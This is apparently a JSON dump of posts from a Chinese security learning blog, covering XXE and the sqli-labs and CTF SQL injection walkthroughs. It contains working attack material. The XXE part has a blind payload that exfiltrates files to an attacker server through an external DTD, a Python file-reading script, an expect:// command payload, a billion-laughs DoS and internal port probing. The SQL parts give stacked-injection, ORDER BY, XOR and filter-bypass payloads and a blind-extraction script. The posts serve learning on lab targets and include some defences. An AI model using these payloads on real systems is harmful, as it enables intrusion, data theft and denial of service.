sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); } header(&#39;Content-Type: text/html; charset=utf-8&#39;); echo $result; ?&gt; 有回显 构造payload &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;!DOCTYPE hack [ &lt;!ENTITY file SYSTEM &quot;file:///d:/qwzf.txt&quot;&gt; ]&gt; &lt;user&gt; &lt;username&gt;&amp;file;&lt;/username&gt; &lt;password&gt;hack&lt;/password&gt; &lt;/user&gt; 当然，也可以使用php://filter协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件) php://filter/read=convert.base64-encode/resource= 无回显 修改源码，禁掉输出代码和报错信息，改成无回显。遇到无回显，可以通过Blind XXE方法加上外带数据通道来提取数据，先使用php://filter协议获取目标文件的内容，然后将内容以http请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。 这里我使用的攻击机ip为：192.168.201.128 构造payload &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt; %dtd; %send; ]&gt; 远程服务器部署evil.dtd内容为: &lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://192.168.201.128/?content=%file;&#39;&gt;&quot;&gt; %payload; %要进行实体编码&amp;#x25进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(这里是ubantu的apache日志记录)ubantu查看apache日志记录命令： tail -f /var/log/apache2/access.log 无回显攻击流程： 先调用%dtd，请求远程服务器(攻击服务器)上的evil.dtd。 再调用 evil.dtd中的 %file。%file 获取受攻击的服务器上面的敏感文件，然后将 %file 的返回结果传到%send 。 然后调用 %send; 把读取到的数据发送到远程服务器上。 这样就实现了外带数据的效果，解决 XXE 无回显的问题。 使用并分析恶意脚本xxe2.php &lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&gt;name; ?&gt; 读取文件.py #!/usr/bin/python # -*- coding:utf-8 -*- import urllib2 if __name__ == &#39;__main__&#39;: print u&#39;输入要访问的地址，如http://127.0.0.1/xml/xxe2.php&#39; url = raw_input() count=1 while count==1: print u&#39;输入要读取的文件，如file:///etc/passwd&#39; payload = raw_input() headers = {&#39;Content-type&#39;: &#39;text/xml&#39;} xml = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;&#39; + payload + &#39;&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#39; req = urllib2.Request(url = url,headers = headers, data = xml) res_data = urllib2.urlopen(req) res = res_data.read() print res 通过urllib2的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器相关文件内容。 2、执行系统命令在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 通过XXE可以实现RCE的实例很少。 3、拒绝服务攻击(Dos)&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 原理：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 4、探测内网端口与攻击内网网站探测内网端口 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 3306端口开放3389端口未开放 攻击内网网站 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 0x06 XXE漏洞防御1、使用开发语言提供的禁用外部实体的方法php: libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2、过滤用户提交的XML数据过滤关键字：&lt;\\!DOCTYPE和&lt;\\!ENTITY，或者SYSTEM和PUBLIC。3、不允许XML中含有自己定义的DTD 0x07 后记总算把常见XML漏洞学完了，这里重点学习了XXE漏洞(XML外部实体注入)。整体来说，收获很大。 参考博客：XML实体注入漏洞漏洞利用: XML外部实体（XXE）注入","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"XXE漏洞","slug":"漏洞原理/XXE漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/XXE漏洞/"}],"tags":[{"name":"XML","slug":"XML","permalink":"https://qwzf.github.io/tags/XML/"},{"name":"XML注入","slug":"XML注入","permalink":"https://qwzf.github.io/tags/XML注入/"},{"name":"Xpath注入","slug":"Xpath注入","permalink":"https://qwzf.github.io/tags/Xpath注入/"},{"name":"XXE漏洞","slug":"XXE漏洞","permalink":"https://qwzf.github.io/tags/XXE漏洞/"}],"author":"qwzf"},{"title":"sqli-labs攻关5(Sta)(Less-39_Less-53)","slug":"sqli-labs攻关5(Sta)(Less-39_Less-53)","date":"2019-11-16T15:58:43.000Z","updated":"2020-08-01T16:56:39.931Z","comments":true,"path":"2019/11/16/sqli-labs攻关5(Sta)(Less-39_Less-53)/","link":"","permalink":"https://qwzf.github.io/2019/11/16/sqli-labs攻关5(Sta)(Less-39_Less-53)/","excerpt":"","text":"前言闲来无事，继续打sqlilabs，并总结相关知识。 一、堆叠注入(Less-39-Less-45)Stacked injection：堆叠注入(堆查询注入) 堆叠注入的原理在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。 而union injection(联合注入)也是将两条语句合并在一起，两者之间有什么区别？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句(增删改查)。例如：用户输入1; DELETE FROM products服务器端生成的sql语句为： select * from prosducts where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 堆叠注入的局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。发现了一张图上面说不支持mysql/php环境，但测试后发现支持，应该是版本的不同的原因。 堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议使用union(联合)注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 堆叠注入的使用条件堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用。利用mysqli_multi_query()函数就支持多条sql语句同时执行。但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。 了解堆叠注入之后开始攻关 Less-39测试后发现，为数字型。就借此再练习一下SQL语句吧！增 id=1;insert into users(id,username,password) values(39,&#39;Less39&#39;,&#39;Less39&#39;)--+ 删 id=1;delete from users where id=39--+ 改 id=1;update users set password=&#39;admin&#39; where id=8--+ 查 id=1;select * from users where id=8--+ 发现浏览器上并没有显示查询结果。于是想到堆叠注入的局限性：代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果。因此，在读取数据时，可以使用union(联合)注入。 id=0 union select 1,2,database()--+ Less-40查询源码，得到闭合方式为&#39;)。因为不会报错，需要用盲注猜测闭合方式。如果只闭合&#39;，可以使用盲注来做题 id=1&#39; and ascii(substr((select database()),1,1))&gt;-1 and &#39;1&#39;=&#39;1 同样也可以用堆叠注入，参考Less-39Less-41同样是堆叠注入，不会报错，为数字型注入。参考Less-39Less-42看着好像二次注入的页面，更改密码页是二次注入。不再描述。 $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]); $password = $_POST[&quot;login_password&quot;]; 发现login_user被过滤，注入点应该在login_password。mysqli_real_escape_string() 因为源码中，仍然有mysqli_multi_query()函数。所以可以继续使用堆叠注入,并且这是POST型堆叠注入，单引号闭合。创建一个等于users的test表 login_user=admin&amp;login_password=1&#39;;create table test like users;--+ 创建成功，并且表为空其他操作，类似。Less-43测试发现，闭合方式为&#39;)，其余参考Less-42Less-44这里没有了报错，但是注入语句还是一样的，可用盲注猜测闭合方式。也可以用其他方法猜测。闭合方式&#39;，其他类似Less-42Less-45仍然是堆叠注入，不会报错，可用盲注猜测闭合方式。也可以用其他方法猜测。闭合方式&#39;)，其他类似Less-42 CTF例题实战例题：[强网杯 2019]随便注环境平台：BUUCTF首先，先进行测试，发现单引号闭合。然后使用几乎万能的明注方法–报错注入，发现一些关键字被过滤，只可以爆出数据库。payload ?inject=1&#39; and extractvalue(1,concat(0x7e,database(),0x7e))--+ 然后试下堆叠注入。因为一些关键字被过滤，所以应该可以使用没有被过滤的show关键字。爆库 inject=1&#39;;show databases;# 爆表 inject=1&#39;;show tables;# 爆字段先爆words表的字段 inject=1&#39;;show columns from `words`;# 没有有用信息，然后爆1919810931114514表的字段，发现flag字段 inject=1&#39;;show columns from `1919810931114514`;# 爆数据最后爆数据，就应该能得到flag了，但我不会爆，于是看了大师傅的思路思路一： 1.将words表改名为word1或其它任意名字 : rename table words to word1;2.1919810931114514改名为words : rename table 1919810931114514 to words;3.将新的word表插入一列，列名为id : alter table words add id int unsigned not Null auto_increment primary key;4.将flag列改名为data : alert table words change flag data varchar(100); payload 1&#39;;rename table `words` to `word1`;rename table `1919810931114514` to `words`;alter table `words` add id int unsigned not Null auto_increment primary key; alert table `words` change `flag` `data` varchar(100);# 接着我们再用1’ or 1=1 #,查询就得到flag思路二：读取flag字段内的数据，我们要执行的目标语句是： select * from `1919810931114514`; 而读取flag字段内的数据，需要绕过select的限制。可以使用预编译的方式。预编译相关语法如下： set用于设置变量名和值 prepare用于预备一个语句，并赋予名称，以后可以引用该语句 execute执行语句 deallocateprepare用来释放掉预处理的语句 分析payload -1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;# 拆分payload： -1&#39;; set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;); prepare stmt from @sql; EXECUTE stmt; # 结果为： strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) 这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，将其大写即可。 -1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);Prepare stmt from @sql;EXECUTE stmt;# 拆分payload： -1&#39;; Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;); Prepare stmt from @sql; EXECUTE stmt; # 二、order by排序注入(Less-46-Less-53)order by排序id升序排序：select * from users order by id asc;id降序排序：select * from users order by id desc; mysql&gt; select * from users order by id asc; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ 13 rows in set (0.00 sec) mysql&gt; select * from users order by id desc; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 14 | admin4 | admin4 | | 12 | dhakkan | dumbo | | 11 | admin3 | admin3 | | 10 | admin2 | admin2 | | 9 | admin1 | admin1 | | 8 | admin | admin | | 7 | batman | mob!le | | 6 | superman | genious | | 5 | stupid | stupidity | | 4 | secure | crappy | | 3 | Dummy | p@ssword | | 2 | Angelina | I-kill-you | | 1 | Dumb | Dumb | +----+----------+------------+ 13 rows in set (0.00 sec) mysql&gt; 其中select * from users order by id desc;的desc是可控的传参值。 什么是order by排序注入指可控制的位置在order by子句后，如下order参数可控：select * from goods order by $_GET[&#39;order&#39;] 注入判断在之前的注入利用order by子句进行快速猜解列数，再配合union select语句进行回显。在不知道列名的情况下可以通过列的的序号来指代相应的列。但是却无法做运算，如：order=2-1 和order=1是不一样的。 本地测试环境&lt;?php //error_reporting(0); $mysql_server=&quot;localhost&quot;; $mysql_username=&quot;root&quot;; $mysql_userpass=&quot;xxxx&quot;; $mysql_select_db=&quot;test&quot;; $config=@mysqli_connect($mysql_server,$mysql_username,$mysql_userpass,$mysql_select_db)or die (mysql_error()); if( isset( $_REQUEST[ &#39;order&#39; ]) ) { $order = $_REQUEST[ &#39;order&#39; ]; $sql = &quot;select * from users order by id {$order};&quot;; $result = mysqli_query($config,$sql) or die( $sql.&quot;&lt;pre&gt;&quot; . mysqli_error($config) . &quot;&lt;/pre&gt;&quot;); $num = mysqli_num_rows( $result ); $i = 0; while( $i &lt; $num ) { $row = mysqli_fetch_array($result,MYSQLI_ASSOC); echo &quot;&lt;pre&gt;id: {$row[&#39;Id&#39;]} usr: {$row[&#39;user&#39;]} passwd: {$row[&#39;password&#39;]}&lt;/pre&gt;&quot;; $i++; } mysqli_close($config); }else{ echo &quot;set order&quot;; } ?&gt; 构造Payload构造出类似and 1=1、and 1=2的Payload以测试注入。 http://127.0.0.1/php/orderby.php?order=and if(1=1,user,password) //通过user字段排序 http://127.0.0.1/php/orderby.php?order=and if(1=2,user,password) //通过password字段排序 http://127.0.0.1/php/orderby.php?order=and (CASE+WHEN+(1=1)+THEN+user+ELSE+password+END) //通过user字段排序 http://127.0.0.1/php/orderby.php?order=and (CASE+WHEN+(1=1)+THEN+user+ELSE+password+END) //通过password字段排序 http://127.0.0.1/php/orderby.php?order=and IFNULL(NULL,password) //通过user字段排序 http://127.0.0.1/php/orderby.php?order=and IFNULL(NULL,user) //通过password字段排序 可以观测到排序的结果不一样 http://127.0.0.1/php/orderby.php?order=and rand(1=1) http://127.0.0.1/php/orderby.php?order=and rand(1=2) 注入方法1、利用报错1.返回多条记录 ?order=IF(1=1,1,(select+1+union+select+2)) //正确 ?order=IF(1=2,1,(select+1+union+select+2)) //错误 ?order=IF(1=1,1,(select+1+from+information_schema.tables)) //正常 ?order=IF(1=2,1,(select+1+from+information_schema.tables)) //错误 2.利用regexp ?order=(select+1+regexp+if(1=1,1,0x00)) //正常 ?order=(select+1+regexp+if(1=2,1,0x00)) //错误 通过下可以得知user()第一位为r,ascii码的16进制为0x72 ?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) //正确 ?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) //错误 3.利用updatexml ?order=updatexml(1,if(1=1,1,user()),1) //正确 ?order=updatexml(1,if(1=2,1,user()),1) //错误 4.利用extractvalue ?order=extractvalue(1,if(1=1,1,user())) //正确 ?order=extractvalue(1,if(1=2,1,user())) //错误 5、报错注入 2、利用盲注如果直接if(1=2,1,sleep(2))sleep时间将会变成2*当前表中记录的数目，将会对服务器造成一定的拒绝服务攻击。 ?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) //正常响应时间 ?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) //sleep 2秒 Less-46标题和ORDER BY 从句相关，应该就是order by排序注入。查看源码 $sql = &quot;SELECT * FROM users ORDER BY $id&quot;; 发现根据输进去的id值是对应的那一列进行排序。需要get传参sort，测试发现是数字型注入。使用sort=1 desc和sort=1 asc来判断，发现存在排序注入。利用报错或利用盲注，进行爆库、爆表等其它注入操作。利用报错 sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1) 利用盲注两个and，前两个条件只要有一个条件是false就不会运行if语句。 sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null) 或结合rand() sort=rand(ascii(substr((select database()),1,1))&gt;127) Less-47与Less-46相比，闭合方式变为&#39;闭合。其它参考Less-46。Less-48盲注测试，发现是数字型注入。进行盲注 sort=rand(ascii(substr((select database()),1,1))&gt;127) Less-49闭合方式为&#39;闭合。测试后发现Less-48的方法行不通。应该可以使用时间盲注。测试后发现，可以使用时间盲注。 sort=1&#39; and if(((ascii(substr((select database()),1,1)))&gt;1),sleep(3),0)--+ Less-50数字型注入。利用报错。参考Less-46。源码中使用mysqli_multi_query()函数，也可以进行堆叠注入。 sort=1;insert into users(id,username,password) values(&#39;16&#39;,&#39;qwzf&#39;,&#39;qwzf&#39;); Less-51单引号闭合，desc,asc判断是order by注入。可以利用报错。源码中使用mysqli_multi_query()函数也，可以进行堆叠注入。Less-52盲注判断为数字型注入。依然有mysqli_multi_query()函数，可以进行堆叠注入。Less-53和Less-52相比，变成单引号闭合。 三、异或注入通过攻关sqli-labs的方式基本上总结完SQL注入了。但我又发现了一种SQL注入类型–异或注入，于是就再总结一下。 背景在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。 异或注入的原理异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null。如果从数学的角度理解就是，空集与任何集合的交集都为空。mysql里异或运算符为^ 或者 xor 两个同为真的条件做异或，结果为假 两个同为假的条件做异或，结果为假 一个条件为真，一个条件为假，结果为真 null与任何条件（真、假、null）做异或，结果都为null xor与^区别 ^运算符会做位异或运算 如1^2=3 1^2=3 xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据 判断过滤在id=1后面输入 &#39; ^ (0)--+?id=1&#39; ^ (length(&#39;union&#39;)=5)--+当union被过滤时1^0 输出id=1当union没被过滤时 1^1 输出 id=0 CTF例题实战例题：Bugku-多次环境平台：Bugku加上&#39;，报错但是%23不报错，说明是字符注入。加上&#39;--+，也不报错，说明可以用--+注释。加上&#39; or 1=1--+,报错；尝试&#39; oorr 1=1--+，正常；说明or被过滤了。 如果要判断哪些关键字被过滤，可以使用异或注入。 id=1&#39;^(length(&#39;union&#39;)!=0)--+ 返回正常说明union被过滤了。同理，尝试出来被过滤的关键字：union、select、and、or、（order、information中含or）由最上面知道可以双写绕过。猜字段数 http://123.206.87.240:9004/1ndex.php?id=1&#39; oorrder by 2 --+ 正常 http://123.206.87.240:9004/1ndex.php?id=1&#39; oorrder by 3 --+ 报错 字段数为2判断显示位 id=-1&#39; ununionion selselectect 1,2 --+ 显示位在2爆库 id=-1&#39; ununionion selselectect 1,database() --+ 库名：web1002-1爆表 id=-1&#39; ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;web1002-1&#39;--+ 其他就不演示了。 后记Page-3通关完毕。39关到45关主要涉及堆叠注入，46关到53关主要涉及order by排序注入。看了一眼，发现Page-4的关卡会限定查询次数，最多只能尝试10次。其他基本都是些常规的注入操作，就不总结了。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"题目复现","slug":"题目复现","permalink":"https://qwzf.github.io/tags/题目复现/"},{"name":"靶场练习","slug":"靶场练习","permalink":"https://qwzf.github.io/tags/靶场练习/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"https://qwzf.github.io/tags/堆叠注入/"},{"name":"order by排序注入","slug":"order-by排序注入","permalink":"https://qwzf.github.io/tags/order-by排序注入/"},{"name":"异或注入","slug":"异或注入","permalink":"https://qwzf.github.io/tags/异或注入/"}],"author":"qwzf"},{"title":"sqli-labs攻关4(Adv)(Less-23_Less-38)","slug":"sqli-labs攻关4(Adv)(Less-23_Less-38)","date":"2019-11-12T15:02:46.197Z","updated":"2020-08-01T16:56:22.183Z","comments":true,"path":"2019/11/12/sqli-labs攻关4(Adv)(Less-23_Less-38)/","link":"","permalink":"https://qwzf.github.io/2019/11/12/sqli-labs攻关4(Adv)(Less-23_Less-38)/","excerpt":"","text":"前言总结完最常见的GET型和POST型的联合查询注入、报错注入、SQL盲注，以及简单POST注入。于是继续总结二次注入、GET型过滤敏感关键字注入、WAF绕过注入、宽字节注入。 一、二次注入(Less-24)二次注入：攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。二次注入需要具备的两个条件： 用户向数据库插入恶意语句(即使后端对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义) 数据库对自己存储的数据非常放心，直接取出恶意数据给用户 Less-24猜测这是二次注入，查看源码发现与数据库交互的有注册、登录和改密，即login_create.php，login.php，pass_change.php这三个文件。login_create.php $username= mysql_escape_string($_POST[&#39;username&#39;]) ; $pass= mysql_escape_string($_POST[&#39;password&#39;]); $re_pass= mysql_escape_string($_POST[&#39;re_password&#39;]); echo &quot;&lt;font size=&#39;3&#39; color=&#39;#FFFF00&#39;&gt;&quot;; $sql = &quot;select count(*) from users where username=&#39;$username&#39;&quot;; login.php $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]); $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]); $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;; pass_change.php $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]); $pass= mysql_real_escape_string($_POST[&#39;password&#39;]); $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]); if($pass==$re_pass) { $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; 发现很多传参都被过滤之后，才执行SQL语句，主要利用了mysql_real_escape_string()函数只有$_SESSION[&quot;username&quot;]没有被过滤。这个SQL语句是用来更改密码的。mysql_real_escape_string()函数只会过滤以下字符：\\x00、\\n、\\r、\\、&#39;、&quot;、\\x1a而注释是不会过滤掉的，所以可以注册一个包含注释符号(如：#)的username，然后用这个username更改密码的时候会被注入到update语句中，更改注释前面的用户名的密码。 假设我们想登录admin账户且不知道账户密码。如果要更改用户名为admin的密码，只需注册一个admin&#39;#用户然后登陆，更改密码为1234。看下数据库，发现admin账户的密码被改成了1234然后登录框，输入admin 1234就可以登录admin账户了。。。 二、GET型过滤敏感关键字注入(Less-23-Less-28a)Less-23(过滤注释)添加\\发现报错，得到闭合方式为&#39;测试发现--+、#和%23都被过滤了,即过滤了注释。所以就只能用闭合后面引号的方法，根据报错可以知道语句为id=&#39;$ID&#39; limit 0,1那么可以这样闭合id=1&#39; or &#39;1&#39;=&#39;1或者是id=1&#39; and &#39;1&#39;=&#39;1其他注入操作，可以使用联合查询注入或报错注入或延时注入。这里举个爆库的例子联合查询注入联合查询前边步骤就不写了。直接爆库 id=-1&#39; union select 1,database(),&#39;3 报错注入 id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1 延时注入(SQL盲注) id=1&#39; and if(length(database())=8,sleep(5),1) and &#39;1&#39;=&#39;1 id=1&#39; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1) and &#39;1&#39;=&#39;1 Less-25(过滤了or和and)单引号报错,依旧是单引号闭合，注释正常。根据题目，发现果然是被过滤了and和or。然后看了一下源码怎么写的 function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) return $id; } 发现使用模式修正符i，i 在和模式进行匹配时不区分大小写。所以不可以使用大小写绕过。可以用逻辑运算符&amp;&amp;代替and，||代替or。但&amp;要换成%26url编码 id=1&#39; || 1=1--+ id=1&#39; %26%26 1=1--+ 当然也可以使用双写绕过aandnd、oorr。然后其他注入操作呢，依旧可以使用联合查询注入、报错注入，和Less-23类似。报错注入 id=1&#39; || updatexml(1,concat(0x7e,database(),0x7e),1)--+ Less-25a(过滤or和and的盲注)将Less-25的单引号字符型改为整型，然后使用盲注即可，注意双写绕过。布尔盲注 id=1 || length(database())=8 --+ 可以写个脚本，这里直接放上飘零师傅的脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- import requests #url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select database()),%s,1))=%d&quot; #url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select group_concat(table_name) from infoorrmation_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%d&quot; #url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),%s,1))=%d&quot; url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select passwoorrd from users where username=&#39;admin&#39;),%s,1))=%d&quot; result = &quot;&quot; # 爆库：select database() # security # 爆表：select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() # emails,referers,uagents,users # 爆字段：select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39; # USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password # 拿数据：select passwoorrd from user where username=&#39;admin&#39; # 2333 for i in range(1,100): for j in range(33,127): payload = url%(i,j) s = requests.get(url=payload) if &quot;Your Login name:Dumb&quot; in s.content: result += chr(j) print result break print result 当然也可以联合查询注入。 id=-1 union select 1,database(),3--+ Less-26(过滤注释和空格)题目标题说过滤了注释和空格。测试一下，看看是不是过滤了注释和空格。试了一把，发现还过滤了and和or。输入 ?id=and or 1=1--+# 然后又查看下源码 function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out -- $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out # $id= preg_replace(&#39;/[\\s]/&#39;,&quot;&quot;, $id); //Strip out spaces $id= preg_replace(&#39;/[\\/\\\\\\\\]/&#39;,&quot;&quot;, $id); //Strip out slashes return $id; } 发现过滤了and，or，单行多行注释，正反斜杠/与\\ ,空格，没有过滤单引号。对于注释可以进行单引号闭合，不使用注释；对于and和or可以双写绕过；对于空格，看大师傅博客，发现了一些方法： %09 TAB键（水平）%09 TAB键（水平）%0a 新建一行%0c 新的一页%0d return功能%0b TAB键（垂直）%a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符) 